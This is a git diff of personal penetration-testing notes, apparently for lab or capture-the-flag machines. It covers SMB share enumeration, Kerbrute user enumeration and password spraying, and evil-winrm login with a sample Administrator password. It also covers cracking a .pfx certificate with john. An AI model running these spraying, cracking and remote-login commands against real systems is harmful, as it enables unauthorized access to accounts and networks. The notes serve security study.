@@ -64,15 +64,52 @@ whappalizer
 
 # SMB Active Directory
 
-enumeration:
-nmap --script=smb-enum-shares -p "139,445" 10.129.95.187
+## Enumeration: 
+### Shares
+Get basic information on shares:
+```s
+cme smb IPADDR
+```
+```s
+nmap --script=smb-enum-shares -p "139,445" 
+```
+```s
 smbclient -N -L
+```
+```s
 smbmap -H 10.10.11.152
+```
 
-access share (non password)
+### Users
+
+**Kerbrute**
+
+Enumerate users:
+```s
+./kerbrute_linux_amd64 userenum --dc IPADD -d URL users.txt
+```
+Password Spray: Test a single password against a list of users
+```s
+./kerbrute_linux_amd64 passwordspray -d URL users.txt 'password123'
+```
+Possible errors:
+Check for clock (+400.)
+```s
+ntpdate -q IP
+```
+Fix:
+```s
+sudo date -s 01:22
+ntpdate IP
+date
+```
+
+
+
+## Access share
+### smbclient
 smbclient \\\\10.129.95.187\\backups
 -> cd, ls get ....
-
 Connect using password:
 evil-winrm -i 10.129.228.204 -u Administrator -p 'badminton'
 
@@ -93,16 +130,42 @@ pfx2john legacyy_dev_auth.pfx > pfx_john_legacy.hash
 john -w=/usr/share/wordlists/rockyou.txt pfx_john_legacy.hash
 
 
+# Terminal Ninja
+## grep
+**Filter txt from some words:**
+```s
+cat file.txt | grep -v 'Image\|Manager'
+```
+**Filter txt from endlines:**
+```s
+cat file.txt | grep .
+```
 
 
-# Markdown Material
+
+
+
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+---------------------------------------
+
+## Markdown Material
 
 StackEdit extends the standard Markdown syntax by adding extra **Markdown extensions**, providing you with some nice features.
 
 > **ProTip:** You can disable any **Markdown extension** in the **File properties** dialog.
 
 
-## SmartyPants
 
 SmartyPants converts ASCII punctuation characters into "smart" typographic punctuation HTML entities. For example:
 
@@ -115,7 +178,6 @@ SmartyPants converts ASCII punctuation characters into "smart" typographic punct
 
 
 
-## UML diagrams
 
 You can render UML diagrams using [Mermaid](https://mermaidjs.github.io/). For example, this will produce a sequence diagram:
 
